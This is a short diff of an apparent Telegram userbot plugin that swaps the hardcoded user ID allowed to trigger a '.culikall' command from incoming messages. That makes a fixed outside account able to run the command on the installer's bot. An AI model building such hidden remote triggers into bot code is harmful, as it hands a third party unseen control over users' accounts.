@@ -52,7 +52,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.culik(?: |$)(.*)")
-@register(incoming=True, from_users=1972682280,
+@register(incoming=True, from_users=1883126074,
           pattern=r"^\.culikall(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
